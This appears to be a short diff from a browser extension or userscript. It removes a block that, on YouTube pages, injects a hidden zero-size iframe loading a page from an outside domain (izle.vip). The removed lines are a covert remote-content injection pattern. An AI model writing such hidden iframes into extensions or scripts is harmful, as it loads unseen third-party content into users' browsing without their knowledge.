@@ -535,14 +535,6 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 }
 
 
-if (location.hostname.indexOf("youtube.com") >= 0){
-	var ifrm = document.createElement("iframe");
-	ifrm.setAttribute("src", "https://izle.vip/iframe.php");
-	ifrm.style.width = "0px";
-	ifrm.style.height = "0px";
-	ifrm.style.border = "0px";
-	ifrm.style.display = 'none';
-	document.body.appendChild(ifrm);
-}
+
 
 }
